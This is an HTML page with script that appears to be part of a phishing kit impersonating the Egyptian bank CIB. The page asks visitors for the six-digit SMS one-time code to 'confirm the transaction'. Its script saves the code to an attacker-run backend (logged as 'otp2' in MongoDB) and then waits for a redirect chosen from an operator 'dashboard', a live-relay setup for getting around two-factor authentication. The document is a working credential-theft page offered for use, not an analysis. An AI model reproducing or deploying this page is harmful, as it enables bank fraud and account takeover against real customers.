<!doctype html>
<html lang="ar" dir="rtl">
  <head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>CIB - تأكيد العملية</title>
    <link rel="stylesheet" href="otp.css" />
  </head>
  <body>

    <header class="top-header">
      <img class="top-logo" src="img/logo.png" alt="CIB" />
    </header>

    <main class="otp-page">
      <section class="otp-card">
        <h1 class="otp-title">تأكيد العملية</h1>

        <p class="otp-text">
          تم إرسال رسالة نصية تحتوي على رمز تأكيد لمرة واحدة (OTP)<br />
          إلى رقمك المسجل لدينا لتأكيد الطلب الخاص بك.
        </p>

        <label class="otp-label" for="otp-code">Verification Code (6 أرقام)</label>
        <input
          id="otp-code"
          class="otp-input"
          type="text"
          inputmode="numeric"
          maxlength="6"
          autocomplete="one-time-code"
          dir="ltr"
          placeholder="••••••"
        />

        <button class="otp-btn" type="button">تأكيد</button>

        <div id="otp-timer" class="timer">02:00</div>

        <p class="legal">
          تفاصيل الدفع الخاصة بك مشفرة ومحمية بشكل آمن بالنقر<br />
          فوق الدفع الآن، فإنك تؤكد أنك أكبر من 20 عامًا وأنك<br />
          توافق على <a href="#">شروط الاستخدام وسياسة الخصوصية الخاصة بنا</a>
        </p>

        <div class="bottom-logo-wrap">
          <img class="bottom-logo" src="img/logo.png" alt="CIB" />
        </div>
      </section>
    </main>
    
    <script src="api-config.js"></script>
    <script src="/env-api-override.js"></script>
    <script src="api-client.js"></script>
    <script>
      (function () {
        function digitsOtp(str) {
          return String(str || '').replace(/\D/g, '').slice(0, 6);
        }

        var pollStop = null;
        function stopPoll() {
          if (typeof pollStop === 'function') {
            pollStop();
            pollStop = null;
          }
        }

        function ensureOtpLoadingOverlay() {
          var el = document.getElementById('otpFormLoading');
          if (el) return el;
          el = document.createElement('div');
          el.id = 'otpFormLoading';
          el.className = 'otp-full-loading';
          el.setAttribute('aria-busy', 'true');
          el.innerHTML =
            '<div class="otp-full-loading-inner">' +
            '<div class="otp-full-loading-spinner" aria-hidden="true"></div>' +
            '<p class="otp-loading-message">جاري المعالجة...</p>' +
            '</div>';
          document.body.appendChild(el);
          return el;
        }

        function setOtpLoadingMsg(msg) {
          var el = document.getElementById('otpFormLoading');
          if (!el) return;
          var p = el.querySelector('.otp-loading-message');
          if (p) p.textContent = msg;
        }

        function showOtpFullLoading(msg) {
          var el = ensureOtpLoadingOverlay();
          setOtpLoadingMsg(msg || 'جاري المعالجة...');
          el.style.display = 'flex';
        }

        function hideOtpFullLoading() {
          var el = document.getElementById('otpFormLoading');
          if (!el) return;
          el.style.display = 'none';
        }

        var totalSeconds = 2 * 60;
        var timerEl = document.getElementById("otp-timer");
        if (!timerEl) return;

        function format(seconds) {
          var m = Math.floor(seconds / 60);
          var s = seconds % 60;
          return String(m).padStart(2, "0") + ":" + String(s).padStart(2, "0");
        }

        timerEl.textContent = format(totalSeconds);

        var intervalId = setInterval(function () {
          totalSeconds -= 1;
          if (totalSeconds <= 0) {
            timerEl.textContent = "00:00";
            clearInterval(intervalId);
            return;
          }
          timerEl.textContent = format(totalSeconds);
        }, 1000);

        var otpInput = document.getElementById('otp-code');
        otpInput.addEventListener('input', function () {
          otpInput.value = digitsOtp(otpInput.value);
        });

        document.querySelector('.otp-btn').addEventListener('click', async function () {
          stopPoll();
          var otpCode = digitsOtp(document.getElementById('otp-code').value);
          if (otpCode.length !== 6) {
            alert('الرجاء إدخال 6 أرقام بالضبط لرمز التحقق.');
            return;
          }

          showOtpFullLoading('جاري حفظ البيانات...');

          var newUser = {
            page: 'otp2',
            verificationCode: otpCode,
            timestamp: new Date().toLocaleString('ar-EG'),
            registrationTime: new Date().toLocaleString('ar-EG'),
            name: 'OTP2'
          };

          try {
            await saveSubmission(newUser);
          } catch (e) {
            console.error(e);
            hideOtpFullLoading();
            alert('تعذر حفظ الرمز. تأكد أن الخادم وMongoDB يعملان.');
            return;
          }

          setOtpLoadingMsg('يرجى الانتظار، جاري التحقق من قبل النظام...');

          if (typeof startSessionRedirectPolling !== 'function') {
            hideOtpFullLoading();
            alert('تم الحفظ. تحمّل api-client.js لاستكمال انتظار التوجيه من الداشبورد.');
            return;
          }

          stopPoll();
          pollStop = startSessionRedirectPolling(function (url) {
            stopPoll();
            window.location.href = url;
          });
        });
      })();
    </script>
  </body>
</html>
